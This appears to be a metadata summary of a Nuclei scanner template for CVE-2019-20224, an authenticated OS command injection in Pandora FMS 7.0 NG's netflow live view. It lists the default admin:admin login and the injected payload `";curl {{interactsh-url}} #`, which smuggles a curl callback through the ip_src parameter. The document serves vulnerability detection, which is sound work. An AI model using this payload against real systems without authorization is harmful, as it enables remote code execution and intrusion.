---
cve_id: CVE-2019-20224
template_path: nuclei-templates/http/cves/2019/CVE-2019-20224.yaml
affected_product: Pandora FMS
severity: high
authentication: required
external_callback: true
affected_versions: 7.0 NG (fixed in 7.0 NG 742)
preconditions: [Valid credentials required (default admin:admin tested)]
poc_classification: rce
---

## Vulnerability

CVE-2019-20224 is a remote command injection vulnerability in Pandora FMS 7.0 NG. The vulnerability exists in the netflow live view functionality, specifically in the `ip_src` parameter of the `index.php?operation/netflow/nf_live_view` endpoint. Authenticated users can inject arbitrary OS commands through shell metacharacters in this parameter, leading to remote code execution on the underlying system. The vulnerability is classified as CWE-78 (OS Command Injection) with a CVSS score of 8.8 (High severity). The issue was fixed in Pandora FMS 7.0 NG version 742.

## PoC / Detection

Classification: rce

The template performs a two-step authentication and exploitation process:

1. **Authentication**: Sends a POST request to `/pandora_console/index.php?login=1` with credentials (`nick=admin&pass=admin`) to establish an authenticated session.

2. **Command Injection**: Sends a POST request to `/pandora_console/index.php?sec=netf&sec2=operation/netflow/nf_live_view&pure=0` with multiple netflow parameters. The `ip_src` parameter contains the malicious payload: `";curl {{interactsh-url}} #` which injects a curl command to trigger an HTTP callback.

The template detects successful exploitation by monitoring for HTTP callbacks to the Interactsh server, confirming that the injected command was executed by the target system. A 200 status code response is also required for positive detection.

## References

- https://shells.systems/pandorafms-v7-0ng-authenticated-remote-code-execution-cve-2019-20224/
- https://gist.github.com/mhaskar/2153d66a0928492d76b799ba13b9e3f9
- https://nvd.nist.gov/vuln/detail/CVE-2019-20224
- https://drive.google.com/file/d/1DkWR5MylzeNr20jmHXTaAIJmf3YN-lnO/view
- https://pandorafms.com/downloads/solved-pandorafms-742.mp4
